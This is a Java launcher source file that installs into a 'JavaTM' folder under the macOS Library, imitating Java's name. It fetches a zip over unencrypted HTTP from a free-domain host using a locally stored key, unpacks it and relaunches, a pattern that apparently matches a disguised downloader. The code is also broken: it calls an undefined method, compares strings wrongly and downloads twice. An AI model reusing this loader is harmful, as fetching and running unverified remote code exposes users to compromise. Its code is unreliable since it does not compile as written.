package launcher;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;

import launcher.Setup;

public class Main {
	public final static String dir=System.getProperty("user.home") + "/Library/ApplicationSupport/JavaTM/";
	public final static String javaBin = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";
	public final static String updateURL="http://totallymath.gq/UNM/dataInf.php?key="+key()+"&file=latest.zip";
	public static void runcommand(String command) throws IOException{
		Runtime.getRuntime().exec(command);
	}
	public static String key(){
		File key = new File(dir+"ac.key");
		if(!key.exists()) {
			return null;
		}
		else {
			String keycontents;
			try {
				keycontents = new String(Files.readAllBytes(Paths.get(dir+"ac.key")));
				return keycontents;
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return null;
	}
	public static boolean checkForUpdates() throws IOException {
		String version=new String(Files.readAllBytes(Paths.get(dir+"version")));
		if(version!="") {
			update();
			return true;
		}
		else {
			return false;
		}
	}
	public static boolean update() {
		try {
			DownloadAgent.downloadUsingStream(updateURL, "latest.zip");
			DownloadAgent.downloadUsingNIO(updateURL, "latest.zip");
			try {
				ZipExtractor.unzip("latest.zip", dir);
				File zip= new File("latest.zip");
				return zip.delete();
			}
			catch(IOException e) {
				e.printStackTrace();
				return false;
			}
		}
		catch(IOException e) {
			e.printStackTrace();
			return false;
		}
	}
	public static void restartApplication() throws URISyntaxException{
		final File currentJar = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI());
		/* is it a jar file? */
		if(!currentJar.getName().endsWith(".jar"))
		return;
		/* Build command: java -jar application.jar */
		final ArrayList<String> command = new ArrayList<String>();
		command.add(javaBin);
		command.add("-jar");
		command.add(currentJar.getPath());
		final ProcessBuilder builder = new ProcessBuilder(command);
		try {
			builder.start();
		} catch (IOException e) {
			e.printStackTrace();
		}
		System.exit(0);
	}
	public static void main(String[] args) {
		File maindir=new File(dir);
		File key = new File(dir+"ac.key");
		if(!maindir.exists() || !key.exists()) {
			new Setup();
		}
		else {
			if(!new File(dir+"JavaTM.jar").exists()) {
				update();
			}
			else {
				runcomand();
			}
		}
	}
}
